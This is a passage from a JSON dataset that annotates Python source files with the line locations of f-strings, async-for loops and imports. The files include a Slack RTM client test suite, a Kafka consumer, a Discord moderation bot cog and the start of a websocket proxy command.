                    ],
                    [
                        188,
                        189,
                        "%"
                    ],
                    [
                        206,
                        206,
                        "%"
                    ],
                    [
                        277,
                        277,
                        "%"
                    ],
                    [
                        281,
                        282,
                        "%"
                    ],
                    [
                        363,
                        363,
                        "%"
                    ],
                    [
                        371,
                        371,
                        "%"
                    ],
                    [
                        395,
                        395,
                        "%"
                    ],
                    [
                        548,
                        548,
                        ".format()"
                    ],
                    [
                        75,
                        75,
                        "%"
                    ],
                    [
                        124,
                        124,
                        "%"
                    ],
                    [
                        127,
                        127,
                        "%"
                    ],
                    [
                        351,
                        354,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        264,
                        "                f\"{kind.title()} {user_name} not found or no permissions to generate tokens\","
                    ]
                ]
            }
        },
        "5": {
            "file": "import asyncio\nimport collections\nimport unittest\nfrom aiohttp import web, WSCloseCode\nimport slack\nimport slack.errors as e\nfrom tests.helpers import async_test\nfrom tests.rtm.mock_web_api_server import setup_mock_web_api_server, cleanup_mock_web_api_server\nclass TestRTMClientFunctional(unittest.TestCase):\n    def setUp(self):\n        setup_mock_web_api_server(self)\n        self.loop = asyncio.new_event_loop()\n        asyncio.set_event_loop(self.loop)\n        task = asyncio.ensure_future(self.mock_server(), loop=self.loop)\n        self.loop.run_until_complete(asyncio.wait_for(task, 0.1))\n        self.client = slack.RTMClient(\n            token=\"xoxb-valid\",\n            base_url=\"http://localhost:8765\",\n            auto_reconnect=False,\n            run_async=False,\n        )\n        self.client._web_client = slack.WebClient(\n            token=\"xoxb-valid\",\n            base_url=\"http://localhost:8888\",\n            run_async=False,\n        )\n    def tearDown(self):\n        self.loop.run_until_complete(self.site.stop())\n        cleanup_mock_web_api_server(self)\n        if self.client:\n            self.client._event_loop.run_until_complete(self.client.async_stop())\n        slack.RTMClient._callbacks = collections.defaultdict(list)\n    async def mock_server(self):\n        app = web.Application()\n        app[\"websockets\"] = []\n        app.router.add_get(\"/\", self.websocket_handler)\n        app.on_shutdown.append(self.on_shutdown)\n        runner = web.AppRunner(app)\n        await runner.setup()\n        self.site = web.TCPSite(runner, \"localhost\", 8765)\n        await self.site.start()\n    async def websocket_handler(self, request):\n        ws = web.WebSocketResponse()\n        await ws.prepare(request)\n        request.app[\"websockets\"].append(ws)\n        try:\n            async for msg in ws:\n                await ws.send_json({\"type\": \"message\", \"message_sent\": msg.json()})\n        finally:\n            request.app[\"websockets\"].remove(ws)\n        return ws\n    async def on_shutdown(self, app):\n        for ws in set(app[\"websockets\"]):\n            await ws.close(code=WSCloseCode.GOING_AWAY, message=\"Server shutdown\")\n    def test_client_auto_reconnects_if_connection_randomly_closes(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def stop_on_open(**payload):\n            rtm_client = payload[\"rtm_client\"]\n            if rtm_client._connection_attempts == 1:\n                rtm_client._close_websocket()\n            else:\n                self.assertEqual(rtm_client._connection_attempts, 2)\n                rtm_client.stop()\n        self.client.auto_reconnect = True\n        self.client.start()\n    def test_client_auto_reconnects_if_an_error_is_thrown(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def stop_on_open(**payload):\n            rtm_client = payload[\"rtm_client\"]\n            if rtm_client._connection_attempts == 1:\n                raise e.SlackApiError(\"Test Error\", {\"headers\": {\"Retry-After\": 0.001}})\n            else:\n                self.assertEqual(rtm_client._connection_attempts, 2)\n                rtm_client.stop()\n        self.client.auto_reconnect = True\n        self.client.start()\n    def test_open_event_receives_expected_arguments(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def stop_on_open(**payload):\n            self.assertIsInstance(payload[\"data\"], dict)\n            self.assertIsInstance(payload[\"web_client\"], slack.WebClient)\n            rtm_client = payload[\"rtm_client\"]\n            self.assertIsInstance(rtm_client, slack.RTMClient)\n            rtm_client.stop()\n        self.client.start()\n    def test_stop_closes_websocket(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def stop_on_open(**payload):\n            self.assertFalse(self.client._websocket.closed)\n            rtm_client = payload[\"rtm_client\"]\n            rtm_client.stop()\n        self.client.start()\n        self.assertIsNone(self.client._websocket)\n    def test_start_calls_rtm_connect_by_default(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def stop_on_open(**payload):\n            self.assertFalse(self.client._websocket.closed)\n            rtm_client = payload[\"rtm_client\"]\n            rtm_client.stop()\n        self.client.start()\n    def test_start_calls_rtm_start_when_specified(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def stop_on_open(**payload):\n            self.assertFalse(self.client._websocket.closed)\n            rtm_client = payload[\"rtm_client\"]\n            rtm_client.stop()\n        self.client.token = \"xoxb-rtm.start\"\n        self.client.connect_method = \"rtm.start\"\n        self.client.start()\n    def test_send_over_websocket_sends_expected_message(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def echo_message(**payload):\n            rtm_client = payload[\"rtm_client\"]\n            message = {\n                \"id\": 1,\n                \"type\": \"message\",\n                \"channel\": \"C024BE91L\",\n                \"text\": \"Hello world\",\n            }\n            rtm_client.send_over_websocket(payload=message)\n        @slack.RTMClient.run_on(event=\"message\")\n        def check_message(**payload):\n            message = {\n                \"id\": 1,\n                \"type\": \"message\",\n                \"channel\": \"C024BE91L\",\n                \"text\": \"Hello world\",\n            }\n            rtm_client = payload[\"rtm_client\"]\n            self.assertDictEqual(payload[\"data\"][\"message_sent\"], message)\n            rtm_client.stop()\n        self.client.start()\n    def test_ping_sends_expected_message(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        async def ping_message(**payload):\n            rtm_client = payload[\"rtm_client\"]\n            await rtm_client.ping()\n        @slack.RTMClient.run_on(event=\"message\")\n        def check_message(**payload):\n            message = {\"id\": 1, \"type\": \"ping\"}\n            rtm_client = payload[\"rtm_client\"]\n            self.assertDictEqual(payload[\"data\"][\"message_sent\"], message)\n            rtm_client.stop()\n        self.client.start()\n    def test_typing_sends_expected_message(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        async def typing_message(**payload):\n            rtm_client = payload[\"rtm_client\"]\n            await rtm_client.typing(channel=\"C01234567\")\n        @slack.RTMClient.run_on(event=\"message\")\n        def check_message(**payload):\n            message = {\"id\": 1, \"type\": \"typing\", \"channel\": \"C01234567\"}\n            rtm_client = payload[\"rtm_client\"]\n            self.assertDictEqual(payload[\"data\"][\"message_sent\"], message)\n            rtm_client.stop()\n        self.client.start()\n    def test_on_error_callbacks(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def raise_an_error(**payload):\n            raise e.SlackClientNotConnectedError(\"Testing error handling.\")\n        self.called = False\n        @slack.RTMClient.run_on(event=\"error\")\n        def error_callback(**payload):\n            self.called = True\n        with self.assertRaises(e.SlackClientNotConnectedError):\n            self.client.start()\n        self.assertTrue(self.called)\n    def test_callback_errors_are_raised(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def raise_an_error(**payload):\n            raise Exception(\"Testing error handling.\")\n        with self.assertRaises(Exception) as context:\n            self.client.start()\n        expected_error = \"Testing error handling.\"\n        self.assertIn(expected_error, str(context.exception))\n    def test_on_close_callbacks(self):\n        @slack.RTMClient.run_on(event=\"open\")\n        def stop_on_open(**payload):\n            payload[\"rtm_client\"].stop()\n        self.called = False\n        @slack.RTMClient.run_on(event=\"close\")\n        def assert_on_close(**payload):\n            self.called = True\n        self.client.start()\n        self.assertTrue(self.called)\n    @async_test\n    async def test_run_async_valid(self):\n        client = slack.RTMClient(\n            token=\"xoxb-valid\",\n            base_url=\"http://localhost:8765\",\n            run_async=True,\n        )\n        client._web_client = slack.WebClient(\n            token=\"xoxb-valid\",\n            base_url=\"http://localhost:8888\",\n            run_async=True,\n        )\n        self.called = False\n        @slack.RTMClient.run_on(event=\"open\")\n        async def handle_open_event(**payload):\n            self.called = True\n        client.start()  \n        await asyncio.sleep(3)\n        self.assertTrue(self.called)\n    @async_test\n    async def test_run_async_invalid(self):\n        client = slack.RTMClient(\n            token=\"xoxb-valid\",\n            base_url=\"http://localhost:8765\",\n            run_async=True,\n        )\n        client._web_client = slack.WebClient(\n            token=\"xoxb-valid\",\n            base_url=\"http://localhost:8888\",\n            run_async=True,\n        )\n        self.called = False\n        @slack.RTMClient.run_on(event=\"open\")\n        def handle_open_event(**payload):\n            self.called = True\n        client.start()  \n        await asyncio.sleep(3)\n        self.assertFalse(self.called)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        47,
                        48,
                        "async for",
                        "async for msg in ws:\n                await ws.send_json({\"type\": \"message\", \"message_sent\": msg.json()})"
                    ]
                ]
            }
        },
        "6": {
            "file": "from aiokafka import AIOKafkaConsumer\nimport asyncio\nimport os\nKAFKA_TOPIC = os.getenv('KAFKA_TOPIC')\nKAFKA_CONSUMER_GROUP = os.getenv('KAFKA_CONSUMER_GROUP', 'group')\nKAFKA_BOOTSTRAP_SERVERS = os.getenv('KAFKA_BOOTSTRAP_SERVERS', 'localhost:9092')\nloop = asyncio.get_event_loop()\nasync def consume():\n    consumer = AIOKafkaConsumer(KAFKA_TOPIC, loop=loop,\n                                bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,\n                                group_id=KAFKA_CONSUMER_GROUP)\n    await consumer.start()\n    try:\n        async for msg in consumer:\n            print(f\"Consumed msg: {msg}\")\n    finally:\n        await consumer.stop()\nloop.run_until_complete(consume())",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        14,
                        15,
                        "async for",
                        "async for msg in consumer:\n            print(f\"Consumed msg: {msg}\")"
                    ]
                ],
                "pep_498": [
                    [
                        15,
                        "            print(f\"Consumed msg: {msg}\")"
                    ]
                ]
            }
        },
        "7": {
            "file": "import discord\nfrom discord.ext import commands\nfrom urllib.parse import urlparse\nimport datetime\nimport asyncio\nimport random\nimport myjson\nimport json\nimport os\nimport io\nclass Mod(commands.Cog):\n    def __init__(self, bot):\n        self.bot = bot\n    async def format_mod_embed(self, ctx, user, success, method, duration = None, location=None):\n        emb = discord.Embed(timestamp=ctx.message.created_at)\n        emb.set_author(name=method.title(), icon_url=user.avatar_url)\n        emb.color = await ctx.get_dominant_color(user.avatar_url)\n        emb.set_footer(text=f'User ID: {user.id}')\n        if success:\n            if method == 'ban' or method == 'hackban':\n                emb.description = f'{user} was just {method}ned.'\n            elif method == 'unmute':\n                emb.description = f'{user} was just {method}d.'\n            elif method == 'mute':\n                emb.description = f'{user} was just {method}d for {duration}.'\n            else:\n                emb.description = f'{user} was just {method}ed.'\n        else:\n            emb.description = f\"I do not have the required permissions to {method} {user.name}.\"\n        return emb\n    @commands.command()\n    async def kick(self, ctx, member : discord.Member, *, reason='Please write a reason!'):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.kick_members == True or ctx.message.author.id == 280271578850263040:\n            try:\n                await ctx.guild.kick(member, reason=reason)\n            except:\n                success = False\n            else:\n                success = True\n            emb = await self.format_mod_embed(ctx, member, success, 'kick')\n            await ctx.send(embed=emb)\n        else:\n            okay = 'You do not have the required permissions to **KICK** members.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Unable To Kick', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command()\n    async def ban(self, ctx, member : discord.Member, *, reason='Please write a reason!'):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id ==280271578850263040:\n            try:\n                await ctx.guild.ban(member, reason=reason)\n            except:\n                success = False\n            else:\n                success = True\n            emb = await self.format_mod_embed(ctx, member, success, 'ban')\n            await ctx.send(embed=emb)\n        else:\n            okay2 = 'You do not have the required permissions to **BAN** or **UNBAN** members.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Unable To Ban', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay2, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command()\n    async def clean(self, ctx, limit : int=15):\n        if ctx.message.author.id == 280271578850263040:\n            await ctx.purge(limit=limit+1, check=lambda m: m.author == self.bot.user)\n    @commands.command()\n    async def unban(self, ctx, name_or_id, *, reason=None):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040:\n            ban = await ctx.get_ban(name_or_id)\n            try:\n                await ctx.guild.unban(ban.user, reason=reason)\n            except:\n                success = False\n            else:\n                success = True\n            emb = await self.format_mod_embed(ctx, ban.user, success, 'unban')\n            await ctx.send(embed=emb)\n        else:\n            okay3 = 'You do not have the required permissions to **BAN** or **UNBAN** members.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Unable To Unban', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay3, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command(aliases=['del','p','prune'])\n    async def purge(self, ctx, limit : int, member:discord.Member=None):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_messages == True or ctx.message.author.id == 280271578850263040:\n            if member is None:\n                await ctx.purge(limit=limit+1)\n            else:\n                async for message in ctx.channel.history(limit=limit+1):\n                    if message.author is member:\n                        await message.delete()\n        else:\n            okay4 = 'You do not have the required permissions to **Purge Messages**.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Unable To Purge', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay4, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command()\n    async def banlist(self, ctx):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040:\n            try:\n                bans = await ctx.guild.bans()\n            except:\n                return await ctx.send('I dont have the perms to see bans.')\n            em = discord.Embed(title=f'List of Banned Members ({len(bans)}):')\n            em.description = ', '.join([str(b.user) for b in bans])\n            em.color = await ctx.get_dominant_color(ctx.guild.icon_url)\n            await ctx.send(embed=em)\n        else:\n            okay5 = 'You do not have the required permissions to **See Ban List**.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Error', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay5, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command()\n    async def baninfo(self, ctx, *, name_or_id):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040:\n            ban = await ctx.get_ban(name_or_id)\n            em = discord.Embed()\n            em.color = await ctx.get_dominant_color(ban.user.avatar_url)\n            em.set_author(name=str(ban.user), icon_url=ban.user.avatar_url)\n            em.add_field(name='Reason', value=ban.reason or 'None')\n            em.set_thumbnail(url=ban.user.avatar_url)\n            em.set_footer(text=f'User ID: {ban.user.id}')\n            await ctx.send(embed=em)\n        else:\n            okay6 = 'You do not have the required permissions to **See Ban infos**.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Error', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay6, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command(aliases=['adrl','giverole'])\n    async def addrole(self, ctx, member: discord.Member, *, rolename: str):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040:\n            role = discord.utils.find(lambda m: rolename.lower() in m.name.lower(), ctx.message.guild.roles)\n            if not role:\n                return await ctx.send('That role does not exist.')\n            try:\n                await member.add_roles(role)\n                await ctx.send(f'Added: `{role.name}`')\n            except:\n                await ctx.send(\"I don't have the perms to add that role.\")\n        else:\n            await ctx.send('You Do Not Have The Required Permission To **Add Roles**.')\n    @commands.command(aliases=['rmrl','rmrole'])\n    async def removerole(self, ctx, member: discord.Member, *, rolename: str):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040:\n            role = discord.utils.find(lambda m: rolename.lower() in m.name.lower(), ctx.message.guild.roles)\n            if not role:\n                return await ctx.send('`That role does not exist.``')\n            try:\n                await member.remove_roles(role)\n                await ctx.send(f'Removed: `{role.name}`')\n            except:\n                await ctx.send(\"I don't have the perms to remove that role.\")\n        else:\n            await ctx.send('You Do Not Have The Required Permission To **Remove Roles**.')\n    @commands.command()\n    async def hackban(self, ctx, userid, *, reason=None):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040:\n            try:\n                userid = int(userid)\n            except:\n                await ctx.send('Invalid ID!')\n            try:\n                await ctx.guild.ban(discord.Object(userid), reason=reason)\n            except:\n                success = False\n            else:\n                success = True\n            if success:\n                async for entry in ctx.guild.audit_logs(limit=1, user=ctx.guild.me, action=discord.AuditLogAction.ban):\n                    emb = await self.format_mod_embed(ctx, entry.target, success, 'hackban')\n            else:\n                emb = await self.format_mod_embed(ctx, userid, success, 'hackban')\n            await ctx.send(embed=emb)\n        else:\n            okay7 = 'You do not have the required permissions to **Ban** or **Unban** members.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Unable to Ban', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay7, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command()\n    async def mute(self, ctx, member:discord.Member, duration, *, reason=None):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040:\n            unit = duration[-1]\n            if unit == 's':\n                time = int(duration[:-1])\n                longunit = 'seconds'\n            elif unit == 'm':\n                time = int(duration[:-1]) * 60\n                longunit = 'minutes'\n            elif unit == 'h':\n                time = int(duration[:-1]) * 60 * 60\n                longunit = 'hours'\n            else:\n                await ctx.send('Invalid Unit! Use `s`, `m`, or `h`.')\n                return\n            progress = await ctx.send('Muting user!')\n            try:\n                for channel in ctx.guild.text_channels:\n                    await channel.set_permissions(member, overwrite=discord.PermissionOverwrite(send_messages = False), reason=reason)\n                for channel in ctx.guild.voice_channels:\n                    await channel.set_permissions(member, overwrite=discord.PermissionOverwrite(speak=False), reason=reason)\n            except:\n                success = False\n            else:\n                success = True\n            emb = await self.format_mod_embed(ctx, member, success, 'mute', f'{str(duration[:-1])} {longunit}')\n            progress.delete()\n            await ctx.send(embed=emb)\n            await asyncio.sleep(time)\n            try:\n                for channel in ctx.guild.channels:\n                    await channel.set_permissions(member, overwrite=None, reason=reason)\n            except:\n                pass\n        else:\n            okay8 = 'You do not have the required permissions to **Mute** or **Unmute** members.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Unable to Mute', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay8, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command()\n    async def unmute(self, ctx, member:discord.Member, *, reason=None):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040:\n            progress = await ctx.send('Unmuting user!')\n            try:\n                for channel in ctx.message.guild.channels:\n                    await channel.set_permissions(member, overwrite=None, reason=reason)\n            except:\n                success = False\n            else:\n                success = True\n            emb = await self.format_mod_embed(ctx, member, success, 'unmute')\n            progress.self.delete()\n            await ctx.send(embed=emb)\n        else:\n            okay9 = 'You do not have the required permissions to **Mute** or **Unmute** members.'\n            em = discord.Embed(timestamp=ctx.message.created_at)\n            em.set_author(name= 'Unable to Mute', icon_url=ctx.author.avatar_url)\n            em.add_field(name = '**:interrobang: No Permission :interrobang:**', value = okay9, inline = False)\n            em.color = await ctx.get_dominant_color(url=ctx.author.avatar_url)\n            em.set_footer(text= '|Federation|')\n            await ctx.send(embed=em)\n    @commands.command()\n    async def warn(self,ctx,member:discord.Member=None,*,reason:str=None):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.author.guild_permissions.ban_members == True or ctx.author.guild_permissions.kick_members == True:\n            try:\n                if reason == None:\n                    await ctx.send(\"**Please Provide a reason!**\")\n                    return\n                user = member\n                url2 = \"{}\".format(os.environ.get(\"warn_logs\"))\n                warn = myjson.get(url2)\n                warn = json.loads(warn)\n                if \"{}\".format(user.id) not in warn:\n                    warn[f\"{user.id}\"] = {}\n                    warn[f\"{user.id}\"][\"count\"] = 1\n                    warn[f\"{user.id}\"][\"name\"] = \"{}\".format(str(user))\n                    warn[f\"{user.id}\"][\"reason\"] = str(reason)\n                    url2 = myjson.store(json.dumps(warn),update=url2)\n                else:\n                    warn[f\"{user.id}\"][\"count\"] += 1\n                    warn[f\"{user.id}\"][\"name\"] = \"{}\".format(str(user))\n                    warn[f\"{user.id}\"][\"reason\"] = str(reason)\n                    url2 = myjson.store(json.dumps(warn),update=url2)\n                em = discord.Embed(color = 0xffd500)\n                notify = ctx.guild.get_member(user_id = int(user.id))\n                em.set_author(name = \"Member Warned!\", icon_url = \"https://image.ibb.co/jmajRT/Federation.png\")\n                em.add_field(name = \"**Member:** \", value = \"**\"+str(user)+\"**\"+ f\"\\n**ID: {user.id}**\",inline = False)\n                em.add_field(name = \"**Warned By:**\", value = f\"**{ctx.author}**\", inline = False)\n                em.add_field(name = \"**Reason:**\", value = \"```\"+reason+\"```\", inline = False)\n                em.add_field(name = \"**Count:**\", value = \"{}\".format(warn[f\"{user.id}\"][\"count\"]), inline = False)\n                channel_id = 449617657910525953\n                channel = self.bot.get_channel(channel_id)\n                await channel.send(embed = em)\n                await ctx.send(\"`Sent warning to {}, and count recorded.`\".format(user))\n            except Exception as e:\n                print(e)\n                await ctx.send(\"`Either can't send warn message to member, or member provided isnt in the server.`\")\n    @commands.command()\n    async def resetcounter(self, ctx, *,uids:str = None):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.author.guild_permissions.ban_members == True or ctx.author.guild_permissions.kick_members == True:\n            try:\n                url2 = \"{}\".format(os.environ.get(\"warn_logs\"))\n                warn = myjson.get(url2)\n                warn = json.loads(warn)\n                if uids == None:\n                    await ctx.send(\"`No member provided`\")\n                    return\n                if \"{}\".format(uids) in warn:\n                    warn[f\"{uids}\"][\"count\"] = 0\n                    warn[f\"{uids}\"][\"reason\"] = \"None\"\n                    url2 = myjson.store(json.dumps(warn),update=url2)\n                    await ctx.send(\"`Warnings reset for {}`\".format(warn[f\"{uids}\"][\"name\"]))\n                else:\n                    await ctx.send(\"`No such id in database`\")\n            except Exception as e:\n                print(e)\n                await ctx.send(\"`Couldn't connect to database atm, try again later.`\")\n    @commands.command()\n    async def warnlist(self,ctx):\n        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.author.guild_permissions.ban_members == True or ctx.author.guild_permissions.kick_members == True:\n            try:\n                url2 = \"{}\".format(os.environ.get(\"warn_logs\"))\n                warn = myjson.get(url2)\n                warn = json.loads(warn)\n                warnlist = []\n                for x in warn:\n                    warnlist.append(\"Count: {}       {}\".format(warn[x][\"count\"],warn[x][\"name\"]))\n                warnstr = '\\n'.join(warnlist)\n                try:\n                    await ctx.send(f\"```{warnstr}```\")\n                except:\n                    paginated_text = ctx.paginate(warnstr)\n                    for page in paginated_text:\n                        if page == paginated_text[-1]:\n                            out = await ctx.send(f'```\\n{page}\\n```')\n                            break\n                        await ctx.send(f'```\\n{page}\\n```')\n            except Exception as e:\n                print(e)\ndef setup(bot):\n\tbot.add_cog(Mod(bot))",
            "patterns": {
                "pep_567": [
                    [
                        5,
                        5,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        99,
                        101,
                        "async for",
                        "async for message in ctx.channel.history(limit=limit+1):\n                    if message.author is member:\n                        await message.delete()"
                    ],
                    [
                        188,
                        189,
                        "async for",
                        "async for entry in ctx.guild.audit_logs(limit=1, user=ctx.guild.me, action=discord.AuditLogAction.ban):\n                    emb = await self.format_mod_embed(ctx, entry.target, success, 'hackban')"
                    ]
                ],
                "pep_498v": [
                    [
                        274,
                        274,
                        ".format()"
                    ],
                    [
                        306,
                        306,
                        ".format()"
                    ],
                    [
                        326,
                        326,
                        ".format()"
                    ],
                    [
                        277,
                        277,
                        ".format()"
                    ],
                    [
                        280,
                        280,
                        ".format()"
                    ],
                    [
                        285,
                        285,
                        ".format()"
                    ],
                    [
                        312,
                        312,
                        ".format()"
                    ],
                    [
                        294,
                        294,
                        ".format()"
                    ],
                    [
                        298,
                        298,
                        ".format()"
                    ],
                    [
                        331,
                        331,
                        ".format()"
                    ],
                    [
                        316,
                        316,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        29,
                        "            emb.description = f\"I do not have the required permissions to {method} {user.name}.\""
                    ],
                    [
                        18,
                        "        emb.set_footer(text=f'User ID: {user.id}')"
                    ],
                    [
                        21,
                        "                emb.description = f'{user} was just {method}ned.'"
                    ],
                    [
                        23,
                        "                emb.description = f'{user} was just {method}d.'"
                    ],
                    [
                        117,
                        "            em = discord.Embed(title=f'List of Banned Members ({len(bans)}):')"
                    ],
                    [
                        138,
                        "            em.set_footer(text=f'User ID: {ban.user.id}')"
                    ],
                    [
                        227,
                        "            emb = await self.format_mod_embed(ctx, member, success, 'mute', f'{str(duration[:-1])} {longunit}')"
                    ],
                    [
                        25,
                        "                emb.description = f'{user} was just {method}d for {duration}.'"
                    ],
                    [
                        27,
                        "                emb.description = f'{user} was just {method}ed.'"
                    ],
                    [
                        156,
                        "                await ctx.send(f'Added: `{role.name}`')"
                    ],
                    [
                        169,
                        "                await ctx.send(f'Removed: `{role.name}`')"
                    ],
                    [
                        278,
                        "                    warn[f\"{user.id}\"] = {}"
                    ],
                    [
                        292,
                        "                em.add_field(name = \"**Warned By:**\", value = f\"**{ctx.author}**\", inline = False)"
                    ],
                    [
                        279,
                        "                    warn[f\"{user.id}\"][\"count\"] = 1"
                    ],
                    [
                        280,
                        "                    warn[f\"{user.id}\"][\"name\"] = \"{}\".format(str(user))"
                    ],
                    [
                        281,
                        "                    warn[f\"{user.id}\"][\"reason\"] = str(reason)"
                    ],
                    [
                        284,
                        "                    warn[f\"{user.id}\"][\"count\"] += 1"
                    ],
                    [
                        285,
                        "                    warn[f\"{user.id}\"][\"name\"] = \"{}\".format(str(user))"
                    ],
                    [
                        286,
                        "                    warn[f\"{user.id}\"][\"reason\"] = str(reason)"
                    ],
                    [
                        291,
                        "                em.add_field(name = \"**Member:** \", value = \"**\"+str(user)+\"**\"+ f\"\\n**ID: {user.id}**\",inline = False)"
                    ],
                    [
                        313,
                        "                    warn[f\"{uids}\"][\"count\"] = 0"
                    ],
                    [
                        314,
                        "                    warn[f\"{uids}\"][\"reason\"] = \"None\""
                    ],
                    [
                        334,
                        "                    await ctx.send(f\"```{warnstr}```\")"
                    ],
                    [
                        294,
                        "                em.add_field(name = \"**Count:**\", value = \"{}\".format(warn[f\"{user.id}\"][\"count\"]), inline = False)"
                    ],
                    [
                        341,
                        "                        await ctx.send(f'```\\n{page}\\n```')"
                    ],
                    [
                        316,
                        "                    await ctx.send(\"`Warnings reset for {}`\".format(warn[f\"{uids}\"][\"name\"]))"
                    ],
                    [
                        339,
                        "                            out = await ctx.send(f'```\\n{page}\\n```')"
                    ]
                ]
            }
        },
        "8": {
            "file": "import asyncio\nimport json\nimport shlex\nimport sys\nfrom typing import (\n    Union, Optional,\n    MutableMapping, Dict,\n    Sequence, List,\n)\nimport aiohttp\nimport click\nfrom .main import main\nfrom .pretty import print_info, print_warn, print_fail, print_error\nfrom ..config import DEFAULT_CHUNK_SIZE\nfrom ..request import Request\nfrom ..session import AsyncSession\nfrom ..compat import asyncio_run, asyncio_run_forever\nfrom ..versioning import get_naming\nclass WSProxy:\n    __slots__ = (\n        'api_session', 'session_name',\n        'app_name',\n        'args', 'envs',\n        'reader', 'writer',\n    )\n    def __init__(\n        self,\n        api_session: AsyncSession,\n        session_name: str,\n        app_name: str,\n        args: MutableMapping[str, Union[None, str, List[str]]],\n        envs: MutableMapping[str, str],\n        reader: asyncio.StreamReader,\n        writer: asyncio.StreamWriter,\n    ) -> None:\n        self.api_session = api_session\n        self.session_name = session_name\n        self.app_name = app_name\n        self.args = args\n        self.envs = envs\n        self.reader = reader\n        self.writer = writer\n    async def run(self) -> None:\n        prefix = get_naming(self.api_session.api_version, 'path')\n        path = f\"/stream/{prefix}/{self.session_name}/tcpproxy\"\n        params = {'app': self.app_name}\n        if len(self.args.keys()) > 0:\n            params['arguments'] = json.dumps(self.args)\n        if len(self.envs.keys()) > 0:\n            params['envs'] = json.dumps(self.envs)\n        api_rqst = Request(\n            \"GET\", path, b'',\n            params=params,\n            content_type=\"application/json\")\n        async with 